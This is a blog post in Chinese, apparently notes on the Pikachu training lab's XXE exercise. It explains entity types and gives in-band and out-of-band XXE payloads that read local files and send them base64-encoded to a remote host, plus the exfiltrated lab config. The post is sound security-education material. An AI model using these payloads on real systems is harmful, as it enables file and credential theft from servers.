---
layout: post
title: "Pickachu XXE"
description: ""
date: 2023-07-11
categories:
  - Pickachu_Lab
  - Pickachu_XXE
author: ""
tags: ['Pickachu_Lab', 'XXE']
---



# Pickachu XXE 
###### tags: `Pickachu`,`XXE`


參考:https://zhuanlan.zhihu.com/p/484485642


### xml 小知識1:


* 用 %定義的實體 只能在 DOCTYPE 調用
* 一般定義的實體 只能在 body 中調用

(兩種調用的方式都不一樣) 


### xml 小知識2:

* ANY 表示接受任何的tag
* SYSTEM 代表要請求外部文件(另外還有public 功用差不多)





## 有回顯 通常很簡單




### xml
```xml=
<!DOCTYPE foo [

	<!ELEMENT foo ANY >
    
	<!ENTITY % xxe SYSTEM "file:///C:/Users/liar/Desktop/123.dtd" >

	%xxe;

]>


<foo>&evil;</foo>
```


### dtd
```xml=
<!ENTITY evil SYSTEM "file:///C:/Users/liar/Desktop/123.php" >
```

## 無回顯(使用帶外攻擊)主要有兩種寫法
兩種功能都一樣，只是定義的方式不同，看你喜歡哪一種




### type 1:

### xml
```xml=
<!DOCTYPE foo [


	<!ELEMENT foo ANY >

	<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=file:///C:/Users/liar/Desktop/123.php" >

	<!ENTITY % remote SYSTEM "file:///C:/Users/liar/Desktop/123.dtd" >

	%remote;
	%all;
]>


<foo>&send;</foo>



```


### dtd
```xml=
<!ENTITY % all "<!ENTITY send SYSTEM 'http://192.168.43.84/1.php?file=%file;'>">

```


### 步驟:

1.定義 %file 會去請求目標文件


2.定義 %remote 會去請求惡意DTD


3.首先調用 %remote 就是載入外部 123.DTD

4.123.DTD 裡面定義了 %all 是一個字串

5.調用 %all ，%all 是一個字串，而這個字串實際上又是一個定義 send
```xml=
<!ENTITY send SYSTEM 'http://192.168.43.84/1.php?file=%file;'>
```


6.注意這個字串的尾端 %file ，他此時也被調用了，所以請求到了目標文件的base64格式
(最終字串長這樣)

```xml=
<!ENTITY send SYSTEM 'http://192.168.43.84/1.php?file=D9waHANCi8v5YWo5bGAc2Vzc2lvbl9zdGFydA0Kc2Vzc2lvbl9zdGFydCgpOw0KLy/lhajlsYDlsYXorr7nva7ml7bljLoNCmRhdGVfZGVmYXVsdF90aW1lem9uZV9zZXQoJ0FzaWEvU2hhbmdoYWknKTsNCi8v5YWo5bGA6K6+572u6buY6K6k5a2X56ymDQpoZWFkZXIoJ0NvbnRlbnQtdHlwZTp0ZXh0L2h0bWw7Y2hhcnNldD11dGYtOCcpOw0KLy/lrprkuYnmlbDmja7lupPov57mjqXlj4LmlbANCmRlZmluZSgnREJIT1NUJywgJzEyNy4wLjAuMScpOy8v5bCGbG9jYWxob3N05oiW6ICFMTI3LjAuMC4x5L+u5pS55Li65pWw5o2u5bqT5pyN5Yqh5Zmo55qE5Zyw5Z2ADQpkZWZpbmUoJ0RCVVNFUicsICdyb290Jyk7Ly/lsIZyb2905L+u5pS55Li66L+e5o6lbXlzcWznmoTnlKjmiLflkI0NCmRlZmluZSgnREJQVycsICdyb290MTIzJyk7Ly/lsIZyb2905L+u5pS55Li66L+e5o6lbXlzcWznmoTlr4bnoIHvvIzlpoLmnpzmlLnkuobov5jmmK/ov57mjqXkuI3kuIrvvIzor7flhYjmiYvliqjov57mjqXkuIvkvaDnmoTmlbDmja7lupPvvIznoa7kv53mlbDmja7lupPmnI3liqHmsqHpl67popjlnKjor7QhDQpkZWZpbmUoJ0RCTkFNRScsICdwaWthY2h1Jyk7Ly/oh6rlrprkuYnvvIzlu7rorq7kuI3kv67mlLkNCmRlZmluZSgnREJQT1JUJywgJzMzMDYnKTsvL+WwhjMzMDbkv67mlLnkuLpteXNxbOeahOi/nuaOpeerr+WPo++8jOm7mOiupHRjcDMzMDYNCg0KPz4NCg==;'>
```


7.所以在 foo tag 可以調用 send 帶外。







### type 2:

### xml
```xml=
<!DOCTYPE foo [


	<!ELEMENT foo ANY >

	<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=file:///C:/Users/liar/Desktop/123.php" >

	<!ENTITY % remote SYSTEM "file:///C:/Users/liar/Desktop/123.dtd" >

	%remote;
	%all;
	%send;
]>
```

### dtd
```xml=
<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://192.168.43.84/1.php?file=%file;'>">
```

### 步驟:

1.定義 %file 會去請求目標文件


2.定義 %remote 會去請求惡意DTD


3.首先調用 %remote 就是載入外部 123.DTD

4.123.DTD 裡面定義了 %all 是一個字串

5.調用 %all ，%all 是一個字串，而這個字串實際上又是一個定義 send


```xml=
<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://192.168.43.84/1.php?file=%file;'>">
```


(注意此時這邊% 要轉成 &#x25 ，原因大概是%在xml 中是特殊字元)




6.注意這個字串的尾端 %file ，他此時也被調用了，所以請求到了目標文件的base64格式



(最終字串長這樣)

```xml=
<!ENTITY % send SYSTEM 'http://192.168.43.84/1.php?file=D9waHANCi8v5YWo5bGAc2Vzc2lvbl9zdGFydA0Kc2Vzc2lvbl9zdGFydCgpOw0KLy/lhajlsYDlsYXorr7nva7ml7bljLoNCmRhdGVfZGVmYXVsdF90aW1lem9uZV9zZXQoJ0FzaWEvU2hhbmdoYWknKTsNCi8v5YWo5bGA6K6+572u6buY6K6k5a2X56ymDQpoZWFkZXIoJ0NvbnRlbnQtdHlwZTp0ZXh0L2h0bWw7Y2hhcnNldD11dGYtOCcpOw0KLy/lrprkuYnmlbDmja7lupPov57mjqXlj4LmlbANCmRlZmluZSgnREJIT1NUJywgJzEyNy4wLjAuMScpOy8v5bCGbG9jYWxob3N05oiW6ICFMTI3LjAuMC4x5L+u5pS55Li65pWw5o2u5bqT5pyN5Yqh5Zmo55qE5Zyw5Z2ADQpkZWZpbmUoJ0RCVVNFUicsICdyb290Jyk7Ly/lsIZyb2905L+u5pS55Li66L+e5o6lbXlzcWznmoTnlKjmiLflkI0NCmRlZmluZSgnREJQVycsICdyb290MTIzJyk7Ly/lsIZyb2905L+u5pS55Li66L+e5o6lbXlzcWznmoTlr4bnoIHvvIzlpoLmnpzmlLnkuobov5jmmK/ov57mjqXkuI3kuIrvvIzor7flhYjmiYvliqjov57mjqXkuIvkvaDnmoTmlbDmja7lupPvvIznoa7kv53mlbDmja7lupPmnI3liqHmsqHpl67popjlnKjor7QhDQpkZWZpbmUoJ0RCTkFNRScsICdwaWthY2h1Jyk7Ly/oh6rlrprkuYnvvIzlu7rorq7kuI3kv67mlLkNCmRlZmluZSgnREJQT1JUJywgJzMzMDYnKTsvL+WwhjMzMDbkv67mlLnkuLpteXNxbOeahOi/nuaOpeerr+WPo++8jOm7mOiupHRjcDMzMDYNCg0KPz4NCg==;'>
```
7.所以可以直接使用 %send 不用在  tag裡面調用。
